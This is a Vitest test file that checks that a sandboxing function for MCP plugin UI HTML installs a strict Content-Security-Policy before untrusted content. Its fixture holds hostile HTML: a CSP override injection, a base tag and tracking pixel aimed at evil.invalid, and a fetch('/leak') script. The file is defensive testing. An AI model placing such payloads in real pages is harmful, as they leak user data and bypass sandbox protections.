// @vitest-environment jsdom

import { describe, expect, it } from "vitest";
import { MCP_UI_CSP, sandboxedMcpHtml } from "./Plugins";

describe("Plugin MCP UI sandbox", () => {
  it("structurally installs the host policy before hostile document content", () => {
    const srcDoc = sandboxedMcpHtml([
      "<!-- <head><meta http-equiv=\"Content-Security-Policy\" content=\"default-src *\"> -->",
      "<html><head><base href=\"https://evil.invalid/\"><script>fetch('/leak')</script></head>",
      "<body><img src=\"https://evil.invalid/pixel\"></body></html>",
    ].join(""));
    const parsed = new DOMParser().parseFromString(srcDoc, "text/html");
    const policies = parsed.querySelectorAll('meta[http-equiv="Content-Security-Policy" i]');

    expect(policies).toHaveLength(1);
    expect(parsed.head.firstElementChild).toBe(policies[0]);
    expect(policies[0]?.getAttribute("content")).toBe(MCP_UI_CSP);
    expect(MCP_UI_CSP).toContain("connect-src 'none'");
    expect(MCP_UI_CSP).toContain("frame-src 'none'");
    expect(MCP_UI_CSP).toContain("form-action 'none'");
    expect(srcDoc).not.toContain("default-src *");
  });
});
